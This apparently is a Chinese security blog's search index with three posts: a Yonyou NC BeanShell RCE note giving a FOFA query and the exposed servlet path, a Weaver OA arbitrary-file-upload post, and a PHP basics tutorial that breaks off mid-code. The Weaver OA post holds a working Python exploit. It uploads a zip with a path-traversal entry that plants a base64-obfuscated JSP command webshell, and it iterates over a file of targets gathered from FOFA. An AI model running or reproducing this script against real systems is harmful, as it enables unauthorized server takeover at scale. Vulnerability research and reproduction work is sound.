<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>用友NC BeanShell远程代码执行漏洞复现</title>
      <link href="posts/63946.html"/>
      <url>posts/63946.html</url>
      
        <content type="html"><![CDATA[<p><strong>漏洞介绍</strong><br>用友NC是面向集团企业的管理软件，其在同类市场占有率中达到亚太第一。该漏洞是由于用友NC对外开放了BeanShell接口，攻击者可以在未授权的情况下直接访问该接口，并构造恶意数据执行任意代码并获取服务器权限。</p><p><strong>影响范围</strong><br>NC 6.5版本</p><p><strong>FAFO</strong><br><code>title==“YONYOU NC”</code></p><p><strong>漏洞利用地址：</strong><br><code>ip/servlet/~ic/bsh.servlet.BshServlet</code></p><p><img src="../images/%E7%94%A8%E5%8F%8BNC_BeanShell%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 用友NC BeanShell远程代码执行漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>泛微OA weaver.common.Ctrl 任意文件上传漏洞复现</title>
      <link href="posts/14280.html"/>
      <url>posts/14280.html</url>
      
        <content type="html"><![CDATA[<h2 id="泛微OA-weaver-common-Ctrl-存在任意文件上传漏洞复现"><a href="#泛微OA-weaver-common-Ctrl-存在任意文件上传漏洞复现" class="headerlink" title="泛微OA weaver.common.Ctrl 存在任意文件上传漏洞复现"></a>泛微OA weaver.common.Ctrl 存在任意文件上传漏洞复现</h2><p><strong>使用需知</strong><br>由于传播和使用本文所提供的任何直接或间接的后果和损失，均由用户承担，作者对此不承担任何责任。如果文章出现敏感内容产生不良影响,请联系作者删除。</p><p><strong>Fofa</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app&#x3D;&quot;泛微-协同办公OA&quot;</span><br></pre></td></tr></table></figure><p><strong>漏洞路径</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;weaver&#x2F;weaver.common.Ctrl&#x2F;.css?arg0&#x3D;com.cloudstore.api.service.Service_CheckApp&amp;arg1&#x3D;validateApp</span><br></pre></td></tr></table></figure><p><img src="../images/%E6%B3%9B%E5%BE%AEOA_weaver.common.Ctrl_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0_1.jpg" alt="img"></p><p><strong>POC</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">import zipfile</span><br><span class="line">import random</span><br><span class="line">import sys</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">def generate_random_str(randomlength&#x3D;16):</span><br><span class="line">    random_str &#x3D; &#39;&#39;</span><br><span class="line">    base_str &#x3D; &#39;ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789&#39;</span><br><span class="line">    length &#x3D; len(base_str) - 1</span><br><span class="line">    for i in range(randomlength):</span><br><span class="line">        random_str +&#x3D; base_str[random.randint(0, length)]</span><br><span class="line">        return random_str</span><br><span class="line">mm &#x3D; generate_random_str(8)</span><br><span class="line"></span><br><span class="line">webshell_name1 &#x3D; mm+&#39;.jsp&#39;</span><br><span class="line">webshell_name2 &#x3D; &#39;..&#x2F;..&#x2F;..&#x2F;&#39;+webshell_name1</span><br><span class="line"></span><br><span class="line">def file_zip():</span><br><span class="line">    shell &#x3D; &quot;&quot;&quot;&lt;%@ page contentType&#x3D;&quot;text&#x2F;html;charset&#x3D;UTF-8&quot; language&#x3D;&quot;java&quot; %&gt;</span><br><span class="line">&lt;%@ page import&#x3D;&quot;sun.misc.BASE64Decoder&quot; %&gt; </span><br><span class="line">&lt;% </span><br><span class="line">    if(request.getParameter(&quot;cmd&quot;)!&#x3D;null)&#123; </span><br><span class="line">        BASE64Decoder decoder &#x3D; new BASE64Decoder();</span><br><span class="line">        Class rt &#x3D; Class.forName(new String(decoder.decodeBuffer(&quot;amF2YS5sYW5nLlJ1bnRpbWU&#x3D;&quot;)));</span><br><span class="line">        Process e &#x3D; (Process)</span><br><span class="line">            rt.getMethod(new String(decoder.decodeBuffer(&quot;ZXhlYw&#x3D;&#x3D;&quot;)), String.class).invoke(rt.getMethod(new String(decoder.decodeBuffer(&quot;Z2V0UnVudGltZQ&#x3D;&#x3D;&quot;))).invoke(null, new Object[]&#123;&#125;), request.getParameter(&quot;cmd&quot;) ); </span><br><span class="line">            java.io.InputStream in &#x3D; e.getInputStream();</span><br><span class="line">            int a &#x3D; -1;</span><br><span class="line">            byte[] b &#x3D; new byte[2048];</span><br><span class="line">            out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">            while((a&#x3D;in.read(b))!&#x3D;-1)&#123;</span><br><span class="line">                out.println(new String(b)); </span><br><span class="line">            &#125;</span><br><span class="line">            out.print(&quot;&lt;&#x2F;pre&gt;&quot;); </span><br><span class="line">        &#125; </span><br><span class="line">%&gt; &quot;&quot;&quot;</span><br><span class="line">    zf &#x3D; zipfile.ZipFile(mm+&#39;.zip&#39;, mode&#x3D;&#39;w&#39;, compression&#x3D;zipfile.ZIP_DEFLATED)</span><br><span class="line">    zf.writestr(webshell_name2, shell)</span><br><span class="line"></span><br><span class="line">def GetShell(urllist):</span><br><span class="line">    file_zip()</span><br><span class="line">    print(&#39;上传文件中&#39;)</span><br><span class="line">    urls &#x3D; urllist + &#39;&#x2F;weaver&#x2F;weaver.common.Ctrl&#x2F;.css?arg0&#x3D;com.cloudstore.api.service.Service_CheckApp&amp;arg1&#x3D;validateApp&#39;</span><br><span class="line">    file &#x3D; [(&#39;file1&#39;, (mm+&#39;.zip&#39;, open(mm + &#39;.zip&#39;, &#39;rb&#39;), &#39;application&#x2F;zip&#39;))]</span><br><span class="line">    requests.post(url&#x3D;urls,files&#x3D;file,timeout&#x3D;60, verify&#x3D;False)</span><br><span class="line">    GetShellurl &#x3D; urllist+&#39;&#x2F;cloudstore&#x2F;&#39;+webshell_name1</span><br><span class="line">    GetShelllist &#x3D; requests.get(url &#x3D; GetShellurl)</span><br><span class="line">    if GetShelllist.status_code &#x3D;&#x3D; 200:</span><br><span class="line">        print(&#39;利用成功webshell地址为:&#39;+GetShellurl)</span><br><span class="line">    else:</span><br><span class="line">        print(&#39;未找到webshell利用失败&#39;)</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    # if (len(sys.argv) &#x3D;&#x3D; 2):</span><br><span class="line">        #  url &#x3D; sys.argv[1] # GetShell(url) # else:</span><br><span class="line">        #  print(&quot;python3 poc.py http:&#x2F;&#x2F;xx.xx.xx.xx&quot;)</span><br><span class="line">    with open(&quot;fofa_result.txt&quot;, &quot;r+&quot;) as f:  # fofa_result.txt自己从fofa上获得的目标网站</span><br><span class="line">        list_urls &#x3D; f.readlines()</span><br><span class="line">        for url in list_urls:</span><br><span class="line">            try:</span><br><span class="line">                GetShell(url.strip())</span><br><span class="line">            except Exception as e:</span><br><span class="line">                pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 泛微OA weaver.common.Ctrl 任意文件上传漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP</title>
      <link href="posts/11574.html"/>
      <url>posts/11574.html</url>
      
        <content type="html"><![CDATA[<h2 id="PHP简介"><a href="#PHP简介" class="headerlink" title="PHP简介"></a>PHP简介</h2><p>学习前提： </p><ul><li>HTML</li><li>CSS</li></ul><p><strong>PHP是什么？</strong></p><ul><li>PHP（全称：PHP：Hypertext Preprocessor，即”PHP：超文本预处理器”）是一种通用开源脚本语言。</li><li>PHP 脚本在服务器上执行。</li><li>PHP 可免费下载使用。</li></ul><p>PHP与JavaScript一样都是弱语言：</p><ul><li>其可以包含：文本、HTML、JavaScript代码和 PHP 代码</li><li>不必向 PHP 声明该变量的数据类型。PHP 会根据变量的值，自动把变量转换为正确的数据类型。</li></ul><p><strong>PHP能做什么？</strong></p><ul><li>PHP 可以生成动态页面内容</li><li>PHP 可以创建、打开、读取、写入、关闭服务器上的文件</li><li>PHP 可以收集表单数据</li><li>PHP 可以发送和接收 cookies</li><li>PHP 可以添加、删除、修改您的数据库中的数据</li><li>PHP 可以限制用户访问您的网站上的一些页面</li><li>PHP 可以加密数据 </li></ul><h2 id="PHP基础"><a href="#PHP基础" class="headerlink" title="PHP基础"></a>PHP基础</h2><h3 id="PHP基础语法"><a href="#PHP基础语法" class="headerlink" title="PHP基础语法"></a>PHP基础语法</h3><p>PHP 脚本可以放在文档中的任何位置。<br>PHP 脚本以 <?php 开始，以 ?> 结束：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F; PHP 代码</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>PHP 文件的默认文件扩展名是 “.php”。<br>PHP 文件通常包含 HTML 标签和一些 PHP 脚本代码<br>PHP 中的每个代码行都必须以分号结束。分号是一种分隔符，用于把指令集区分开来。</p><h4 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;  单行注释</span><br><span class="line">&#x2F;*    *&#x2F;  多行注释</span><br></pre></td></tr></table></figure><h4 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">通过 PHP，有两种在浏览器输出文本的基础指令：echo 和 print。</span><br><span class="line">echo： 可以输出一个或多个字符串</span><br><span class="line">print：只允许输出一个字符串，返回值总为1</span><br><span class="line"></span><br><span class="line">tips：</span><br><span class="line">1. echo输出的速度比print快，echo没有返回值，print有返回值1。</span><br><span class="line">2. 在PHP中，echo和print都是语言结构，使用的时候可以不用加括号，也可以加上括号：echo或echo()。</span><br></pre></td></tr></table></figure><p>实例：如何使用 echo 命令输出字符串（字符串可以包含 HTML 标签）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;&lt;h2&gt;PHP 很有趣!&lt;&#x2F;h2&gt;&quot;;</span><br><span class="line">echo &quot;Hello world!&lt;br&gt;&quot;;</span><br><span class="line">echo &quot;我要学 PHP!&lt;br&gt;&quot;;</span><br><span class="line">echo &quot;这是一个&quot;, &quot;字符串，&quot;, &quot;使用了&quot;, &quot;多个&quot;, &quot;参数。&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>实例：如何使用 echo 命令输出变量和字符串：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$txt1&#x3D;&quot;学习 PHP&quot;;</span><br><span class="line">$txt2&#x3D;&quot;RUNOOB.COM&quot;;</span><br><span class="line">$cars&#x3D;array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;);   &#x2F;&#x2F;Array 数组对象用于在单个的变量中存储多个值。</span><br><span class="line"> </span><br><span class="line">echo $txt1;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;       &#x2F;&#x2F;换行</span><br><span class="line">echo &quot;在 $txt2 学习 PHP &quot;;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo &quot;我车的品牌是 &#123;$cars[0]&#125;&quot;;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>print 使用方法与echo相同，可替换实例中的echo。</p><p><code>**echo PHP_EOL; // 换行符**</code></p><h4 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h4><p>PHP中变量前要加上 $  ,区分大小写。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$x&#x3D;5;</span><br><span class="line">$y&#x3D;6;</span><br><span class="line">$z&#x3D;$x+$y;</span><br><span class="line">echo $z;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h4><p>常量值被定义后，在脚本的其他任何地方都不能被改变。<br>一个常量由英文字母、下划线、和数字组成,但数字不能作为首字母出现。 (常量名不需要加 $ 修饰符)。</p><p>注意： 常量在整个脚本中都可以使用。</p><p><strong>设置PHP常量</strong><br>设置常量，使用 define() 函数，函数语法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bool define ( string $name , mixed $value [, bool $case_insensitive &#x3D; false ] )</span><br></pre></td></tr></table></figure><p>该函数有三个参数：</p><ul><li>name：必选参数，常量的名称，即标志服</li><li>value：必须参数，常量的值</li><li>case_insensitive ：可选参数，如果设置为 TRUE，该常量则大小写不敏感。默认是大小写敏感的。</li></ul><p>实例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F; 区分大小写的常量名，要不区分大小写，在定义的value后，设置true即可</span><br><span class="line">define(&quot;name1&quot;, &quot;刘叨叨&quot;);</span><br><span class="line">echo name1;    &#x2F;&#x2F; 输出 &quot;刘叨叨&quot;</span><br><span class="line">echo &#39;&lt;br&gt;&#39;;</span><br><span class="line">echo NAME1;   &#x2F;&#x2F; 输出 &quot;NAME1&quot;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">注：常量是全局的</span><br><span class="line">常量在定义后，默认是全局变量，可以在整个运行的脚本的任意地方使用</span><br><span class="line">，即便在定义的默认函数体内也同样可以使用</span><br></pre></td></tr></table></figure><h4 id="PHP字符串变量"><a href="#PHP字符串变量" class="headerlink" title="PHP字符串变量"></a>PHP字符串变量</h4><p>字符串变量用于存储并处理文本。</p><p>我们创建一个名为 txt 的字符串变量，并赋值为 “Hello world!” 。然后我们输出 txt 变量的值：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">实例</span><br><span class="line">&lt;?php</span><br><span class="line">$txt&#x3D;&quot;Hello world!&quot;;</span><br><span class="line">echo $txt;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>常用的操作字符串的函数和运算符</strong><br><strong>PHP 并置运算符</strong><br>在 PHP 中，只有一个字符串运算符。<br>并置运算符 (.) 用于把两个字符串值连接起来。<br>下面的实例演示了如何将两个字符串变量连接在一起：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$txt1&#x3D;&quot;Hello world!&quot;;</span><br><span class="line">$txt2&#x3D;&quot;What a nice day!&quot;;</span><br><span class="line">echo $txt1 . &quot; &quot; . $txt2;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">上面的代码将输出：Hello world! What a nice day!</span><br><span class="line"></span><br><span class="line">提示：在上面的代码中，我们已经使用了两次并置运算符。这是由于在两个字符串之间插入一个空格,空格也相当于一个字符串</span><br></pre></td></tr></table></figure><p><strong>PHP strlen()函数</strong><br>有时知道字符串值的长度是很有用的。<br>strlen() 函数返回字符串的长度（字节数）。<br>下面的实例返回字符串 “Hello world!” 的长度：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo strlen(&quot;Hello world!&quot;);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 输出12</span><br></pre></td></tr></table></figure><p>提示：strlen() 常常用在循环和其他函数中，因为那时确定字符串何时结束是很重要的。（例如，在循环中，我们需要在字符串中的最后一个字符之后结束循环。）</p><p><strong>PHP strpos() 函数</strong><br>strpos() 函数用于在字符串内查找一个字符或一段指定的文本。<br>如果在字符串中找到匹配，该函数会返回第一个匹配的字符位置。如果未找到匹配，则返回 FALSE。<br>下面的实例在字符串 “Hello world!” 中查找文本 “world”：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo strpos(&quot;Hello world!&quot;,&quot;world&quot;);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">字符串中的一个字符的位置是0，而不是1</span><br><span class="line">输出 6</span><br></pre></td></tr></table></figure><h4 id="PHP超级全局变量（-重点）"><a href="#PHP超级全局变量（-重点）" class="headerlink" title="PHP超级全局变量（*重点）"></a>PHP超级全局变量（*重点）</h4><p><strong>超全局变量在 PHP 4.1.0 中引入，是在全部作用域中始终可用的内置变量</strong>。</p><p><strong>PHP超级全局变量</strong><br>PHP中预定义了几个超级全局变量（superglobals） ，这意味着它们在一个脚本的全部作用域中都可用。 你不需要特别说明，就可以在函数及类中使用。</p><p>PHP超级全局变量列表：</p><ul><li>$GLOBALS</li><li>$_SERVER</li><li>$_REQUEST</li><li>$_POST</li><li>$_GET</li><li>$_FILES</li><li>$_ENV</li><li>$_COOKIE</li><li>$_SESSION</li></ul><p>下边以实例来介绍这些超级全局变量列表。</p><h5 id="GLOBALS"><a href="#GLOBALS" class="headerlink" title="$GLOBALS"></a>$GLOBALS</h5><p>$GLOBALS 这种全局变量用于在 PHP 脚本中的任意位置访问全局变量（从函数或方法中均可）。<br>PHP 在名为 $GLOBALS[index] 的数组中存储了所有全局变量。变量的名字就是数组的键。<br>以下实例介绍了如何使用超级全局变量 $GLOBALS:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$x &#x3D; 75; </span><br><span class="line">$y &#x3D; 25;</span><br><span class="line"> </span><br><span class="line">function addition() </span><br><span class="line">&#123; </span><br><span class="line">    $GLOBALS[&#39;z&#39;] &#x3D; $GLOBALS[&#39;x&#39;] + $GLOBALS[&#39;y&#39;]; </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">addition(); </span><br><span class="line">echo $z; </span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">注：以上实例中 z 是一个$GLOBALS数组中的超级全局变量，该变量同样可以在函数外访问。</span><br></pre></td></tr></table></figure><h5 id="SERVER"><a href="#SERVER" class="headerlink" title="$_SERVER"></a>$_SERVER</h5><p>$_SERVER 是一个包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组。这个数组中的项目由 Web 服务器创建。不能保证每个服务器都提供全部项目；服务器可能会忽略一些，或者提供一些没有在这里列举出来的项目。</p><p>以下实例中展示了如何使用$_SERVER中的元素:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">echo $_SERVER[&#39;PHP_SELF&#39;];</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo $_SERVER[&#39;SERVER_NAME&#39;];</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo $_SERVER[&#39;HTTP_HOST&#39;];</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo $_SERVER[&#39;HTTP_REFERER&#39;];</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo $_SERVER[&#39;HTTP_USER_AGENT&#39;];</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo $_SERVER[&#39;SCRIPT_NAME&#39;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>下表列出了所有$_SERVER 变量中的重要元素：</p><table><thead><tr><th align="center">元素/代码</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">$_SERVER[‘PHP_SELF’]</td><td align="center">返回当前执行脚本的文件名。与 document root 有关。例如，在地址为 <code>http://example.com/test.php/foo.bar</code> 的脚本中使用 $<em>SERVER[‘PHP_SELF’] 将得到 /test.php/foo.bar。__FILE_</em> 常量包含当前(例如包含)文件的完整路径和文件名。 从 PHP 4.3.0 版本开始，如果 PHP 以命令行模式运行，这个变量将包含脚本名。之前的版本该变量不可用。</td></tr><tr><td align="center">$_SERVER[‘GATEWAY_INTERFACE’]</td><td align="center">返回服务器使用的 CGI 规范的版本。例如，”CGI/1.1”。</td></tr><tr><td align="center">$_SERVER[‘SERVER_ADDR’]</td><td align="center">返回当前运行脚本所在的服务器的 IP 地址。</td></tr><tr><td align="center">$_SERVER[‘SERVER_NAME’]</td><td align="center">当前运行脚本所在的服务器的主机名。如果脚本运行于虚拟主机中，该名称是由那个虚拟主机所设置的值决定。</td></tr><tr><td align="center">$_SERVER[‘SERVER_SOFTWARE’]</td><td align="center">返回服务器标识字符串。在响应请求时的头信息中给出。 (如：Apache/2.2.24)</td></tr><tr><td align="center">$_SERVER[‘SERVER_PROTOCOL’]</td><td align="center">返回请求页面时通信协议的名称和版本。例如，”HTTP/1.0”。</td></tr><tr><td align="center">$_SERVER[‘REQUEST_METHOD’]</td><td align="center">返回访问页面使用的请求方法；例如，”GET”, “HEAD”，”POST”，”PUT”。</td></tr><tr><td align="center">$_SERVER[‘REQUEST_TIME’]</td><td align="center">返回请求开始时的时间戳。从 PHP 5.1.0 起可用。 (如：1377687496)</td></tr><tr><td align="center">$_SERVER[‘QUERY_STRING’]</td><td align="center">返回query string（查询字符串），如果是通过查询字符串访问此页面。</td></tr><tr><td align="center">$_SERVER[‘HTTP_ACCEPT’]</td><td align="center">返回来自当前请求头中 Accept: 项的内容，如果存在的话。</td></tr><tr><td align="center">$_SERVER[‘HTTP_ACCEPT_CHARSET’]</td><td align="center">返回来自当前请求头中 Accept-Charset: 项的内容，如果存在的话。例如：”iso-8859-1,*,utf-8”。</td></tr><tr><td align="center">$_SERVER[‘HTTP_HOST’]</td><td align="center">返回当前请求头中 Host: 项的内容，如果存在的话。</td></tr><tr><td align="center">$_SERVER[‘HTTP_REFERER’]</td><td align="center">引导用户代理到当前页的前一页的地址（如果存在）。由 user agent 设置决定。并不是所有的用户代理都会设置该项，有的还提供了修改 HTTP_REFERER 的功能。简言之，该值并不可信。)</td></tr><tr><td align="center">$_SERVER[‘HTTPS’]</td><td align="center">是否通过安全 HTTP 协议查询脚本。如果脚本是通过 HTTPS 协议被访问，则被设为一个非空的值。</td></tr><tr><td align="center">$_SERVER[‘REMOTE_ADDR’]</td><td align="center">返回浏览当前页面的用户的 IP 地址。</td></tr><tr><td align="center">$_SERVER[‘REMOTE_HOST’]</td><td align="center">返回浏览当前页面的用户的主机名。DNS 反向解析不依赖于用户的 REMOTE_ADDR。</td></tr><tr><td align="center">$_SERVER[‘REMOTE_PORT’]</td><td align="center">返回用户机器上连接到 Web 服务器所使用的端口号。</td></tr><tr><td align="center">$_SERVER[‘SCRIPT_FILENAME’]</td><td align="center">返回当前执行脚本的绝对路径。</td></tr><tr><td align="center">$_SERVER[‘SERVER_ADMIN’]</td><td align="center">该值指明了 Apache 服务器配置文件中的 SERVER_ADMIN 参数。如果脚本运行在一个虚拟主机上，则该值是那个虚拟主机的值。(如：<a href="mailto:&#x73;&#111;&#x6d;&#101;&#111;&#x6e;&#101;&#x40;&#120;&#x78;&#x78;&#46;&#x63;&#x6f;&#109;">&#x73;&#111;&#x6d;&#101;&#111;&#x6e;&#101;&#x40;&#120;&#x78;&#x78;&#46;&#x63;&#x6f;&#109;</a>)</td></tr><tr><td align="center">$_SERVER[‘SERVER_PORT’]</td><td align="center">Web 服务器使用的端口。默认值为 “80”。如果使用 SSL 安全连接，则这个值为用户设置的 HTTP 端口。</td></tr><tr><td align="center">$_SERVER[‘SERVER_SIGNATURE’]</td><td align="center">返回服务器版本和虚拟主机名。</td></tr><tr><td align="center">$_SERVER[‘PATH_TRANSLATED’]</td><td align="center">当前脚本所在文件系统（非文档根目录）的基本路径。这是在服务器进行虚拟到真实路径的映像后的结果。</td></tr><tr><td align="center">$_SERVER[‘SCRIPT_NAME’]</td><td align="center">包含当前脚本的路径。这在页面需要指向自己时非常有用。<code>__FILE__ </code>常量包含当前脚本(例如包含文件)的完整路径和文件名。</td></tr><tr><td align="center">$_SERVER[‘SCRIPT_URI’]</td><td align="center">返回当前页面的URI，URI用来指定要访问的页面。例如 “/index.html”。</td></tr></tbody></table><h5 id="REQUEST"><a href="#REQUEST" class="headerlink" title="$_REQUEST"></a>$_REQUEST</h5><p>PHP $_REQUEST 用于收集HTML表单提交的数据。</p><p>以下实例显示了一个输入字段（input）及提交按钮(submit)的表单(form)。 当用户通过点击 “Submit” 按钮提交表单数据时, 表单数据将发送至<form>标签中 action 属性中指定的脚本文件。 在这个实例中，我们指定文件来处理表单数据。如果你希望其他的PHP文件来处理该数据，你可以修改该指定的脚本文件名。 然后，我们可以使用超级全局变量 $_REQUEST 来收集表单中的 input 字段数据:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"> </span><br><span class="line">&lt;form method&#x3D;&quot;post&quot; action&#x3D;&quot;&lt;?php echo $_SERVER[&#39;PHP_SELF&#39;];?&gt;&quot;&gt;</span><br><span class="line">Name: &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;fname&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;submit&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line"> </span><br><span 